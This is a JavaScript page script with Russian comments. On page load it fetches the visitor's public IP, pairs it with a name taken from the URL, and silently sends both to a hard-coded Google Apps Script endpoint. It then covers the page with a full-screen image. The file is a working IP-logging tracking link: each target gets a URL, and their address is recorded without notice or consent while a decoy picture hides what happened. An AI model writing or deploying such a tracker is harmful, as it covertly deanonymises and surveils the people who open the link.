const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwJHeAh74-LX3GnHOIz1vqTlk1puDJ6DY00uPN8nacaUkDC1p8UnMkKX77SjiGSdqPV2Q/exec";

let urlParams = new URLSearchParams(window.location.search);
let name = urlParams.get('name') || 'unknown';

async function getUniqueUserId() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (e) {
        console.error("Ошибка получения IP:", e);
        return null;
    }
}

async function startTracking() {
    const ip = await getUniqueUserId();
    
    if (ip) {
        console.log("Ваш IP:", ip);
        console.log("Имя:", name);

        // Формируем запрос к Google Таблице
        const finalUrl = `${GOOGLE_SCRIPT_URL}?ip=${ip}&name=${name}`;

        // Отправляем данные (mode: 'no-cors' нужен, чтобы не было ошибок безопасности)
        fetch(finalUrl, { mode: 'no-cors' })
            .then(() => {
                console.log("Данные отправлены в Google Таблицу!!!");
                document.body.innerHTML = `<img style="overflow: hidden; background-position: center; background-size: cover; position: fixed; width: 100%; height: 100%;" src="./assets/img/image.jpg" alt="Успешно">`;
            })
            .catch(err => console.error("Ошибка отправки:", err));
    }
}

startTracking();